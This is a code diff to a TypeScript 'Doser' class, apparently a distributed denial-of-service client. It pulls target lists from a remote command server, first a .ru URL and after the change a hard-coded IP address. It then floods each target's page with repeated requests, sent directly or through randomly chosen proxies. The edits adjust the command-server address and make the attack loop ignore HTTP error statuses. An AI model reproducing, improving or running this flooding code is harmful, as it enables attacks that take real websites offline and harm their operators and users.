@@ -40,17 +40,17 @@ export class Doser {
   }
 
   async loadHostsFile () {
-    const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
-    this.hosts = response.data as Array<string>
+    // const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
+    // this.hosts = response.data as Array<string>
   }
 
   async getRandomTarget () {
     while (this.working) { // escaping unavailable hosts
       try {
-        const hostID = Math.floor(Math.random() * this.hosts.length)
-        console.log(`Selected host id: ${hostID}`)
-        const host = this.hosts[hostID]
-        const response = await axios.get(host, { timeout: 10000 })
+        // const hostID = Math.floor(Math.random() * this.hosts.length)
+        // console.log(`Selected host id: ${hostID}`)
+        // const host = this.hosts[hostID]
+        const response = await axios.get('http://65.108.20.65', { timeout: 10000 })
         if (response.status !== 200) continue
         return response.data as TargetData
       } catch (e) {
@@ -98,7 +98,7 @@ export class Doser {
       for (let atackIndex = 0; (atackIndex < ATACKS_PER_TARGET) && this.working; atackIndex++) {
         try {
           if (directRequest) {
-            const r = await axios.get(target.site.page, { timeout: 5000 })
+            const r = await axios.get(target.site.page, { timeout: 5000, validateStatus: () => true })
             this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
           } else {
             const proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
@@ -111,6 +111,7 @@ export class Doser {
 
             const r = await axios.get(target.site.page, {
               timeout: 5000,
+              validateStatus: () => true,
               proxy: {
                 host: proxyIP,
                 port: proxyPort,
@@ -125,7 +126,10 @@ export class Doser {
           }
         } catch (e) {
           let code = (e as AxiosError).code
-          if (code === undefined) code = 'UNKNOWN'
+          if (code === undefined) {
+            console.log(e)
+            code = 'UNKNOWN'
+          }
           this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
         }
       }
